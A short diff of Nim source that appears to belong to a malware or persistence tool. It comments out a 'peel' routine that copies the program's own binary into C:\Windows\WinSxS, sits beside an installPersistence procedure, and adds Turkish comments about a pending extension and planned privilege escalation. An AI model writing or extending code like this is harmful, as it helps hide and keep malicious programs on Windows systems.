@@ -63,12 +63,14 @@ proc installPersistence*(deployPath: string, index: int = 1) =
   discard p2.waitForExit()
   p2.close()
 ]#
+#daha sonra eklenecek extensionun düzeltilmesi lazım
+
   # When did Windows start peeling oranges.... Privacy is good !
 
 
 
 
-
+#[
 proc peel*() =
   let originBinaryLoc = getAppFilename()
   let baseVaultDir = "C:\\Windows\\WinSxS"
@@ -78,6 +80,8 @@ proc peel*() =
     echo "good peel ", deployTargetPath
   except OSError as e:
     echo "a error ", e.msg
+]#
+# daha sonra yetki yükseltme için bekliyor
 
 proc peel2() =
   let originBinary = getAppFilename()
